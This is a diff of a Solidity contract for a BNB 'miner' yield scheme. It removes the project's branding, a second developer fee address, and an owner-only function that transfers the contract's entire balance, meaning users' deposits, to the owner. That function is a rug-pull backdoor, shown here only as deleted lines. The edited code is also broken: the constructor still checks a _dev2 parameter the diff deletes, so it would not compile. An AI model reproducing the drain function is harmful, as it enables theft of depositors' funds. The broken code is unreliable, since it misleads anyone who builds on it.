@@ -1,28 +1,5 @@
-/**
- *Submitted for verification at BscScan.com on 2022-05-27
-*/
-
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.13;
-
-
-/*
-*
-* ██████╗ ███╗   ██╗██████╗     ██╗  ██╗██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ███╗   ███╗
-* ██╔══██╗████╗  ██║██╔══██╗    ██║ ██╔╝██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║
-* ██████╔╝██╔██╗ ██║██████╔╝    █████╔╝ ██║██╔██╗ ██║██║  ███╗██║  ██║██║   ██║██╔████╔██║
-* ██╔══██╗██║╚██╗██║██╔══██╗    ██╔═██╗ ██║██║╚██╗██║██║   ██║██║  ██║██║   ██║██║╚██╔╝██║
-* ██████╔╝██║ ╚████║██████╔╝    ██║  ██╗██║██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║
-* ╚═════╝ ╚═╝  ╚═══╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
-*                                                                                     
-* BNB Vank - BNB Miner
-*
-* Website  : https://bnbkingdom.xyz
-* Twitter  : https://twitter.com/BNBVank
-* Telegram : https://t.me/BNBVank
-*
-*/
-
 
 contract Ownable{
     address private _owner;
@@ -172,11 +149,10 @@ contract CashMining is Ownable {
 
     mapping(address => User) public users;
 
-    constructor(address payable _dev1, address payable _dev2) {
+    constructor(address payable _dev1) {
 		require(!isContract(_dev1) && !isContract(_dev2));
         // owner = msg.sender;
         dev1 = _dev1;
-        dev2 = _dev2;
         marketEggs = 144000000000;
     }
 
@@ -274,7 +250,6 @@ contract CashMining is Ownable {
         user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
         totalWithdrawn = totalWithdrawn.add(eggsPayout);
     }
-
      
     /* transfer amount of BNB */
     function BuyVaults(address ref) public payable{
@@ -329,7 +304,6 @@ contract CashMining is Ownable {
     function payFees(uint256 eggValue) internal returns(uint256){
         uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
         dev1.transfer(tax);
-        dev2.transfer(tax);
         return tax.mul(5);
     }
 
@@ -536,7 +510,4 @@ contract CashMining is Ownable {
         COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
     }
 
-    function withDraw () onlyOwner public{
-        payable(msg.sender).transfer(address(this).balance);
-    }
 }
